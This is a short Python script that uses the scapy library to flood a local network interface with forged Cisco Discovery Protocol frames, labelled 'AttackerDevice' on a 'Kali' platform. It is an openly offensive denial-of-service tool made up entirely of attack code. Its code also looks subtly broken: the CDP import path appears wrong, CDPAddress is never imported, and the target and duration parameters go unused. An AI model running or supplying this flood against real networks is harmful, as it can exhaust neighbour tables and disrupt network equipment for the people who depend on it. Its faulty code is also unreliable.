#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import CDP

def run_cdp_flood(interface, target=None, duration=60, count=1000):
    print(f"[+] Flooding CDP on {interface} with {count} packets")
    for _ in range(count):
        cdp_pkt = Ether(dst="01:00:0c:cc:cc:cc") / CDP(device_id="AttackerDevice", software_version="v1.0", platform="Kali", addresses=[CDPAddress(type=1, len=4, addr="192.168.1.100")])
        sendp(cdp_pkt, iface=interface, inter=0.001)
    print("[+] CDP flood complete.")
